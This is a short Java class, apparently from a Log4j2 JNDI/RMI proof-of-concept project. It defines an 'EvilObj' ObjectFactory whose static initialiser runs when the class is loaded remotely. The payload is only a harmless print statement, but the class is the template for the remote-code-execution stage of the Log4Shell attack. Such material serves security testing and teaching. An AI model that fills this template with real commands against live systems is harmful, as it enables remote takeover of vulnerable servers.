package com.halibobo.log4j2.rmi;

import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class EvilObj implements ObjectFactory {

  static {
    System.out.println("where i am?");
  }

  @Override
  public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                  Hashtable<?, ?> environment) throws Exception {
    return null;
  }
}
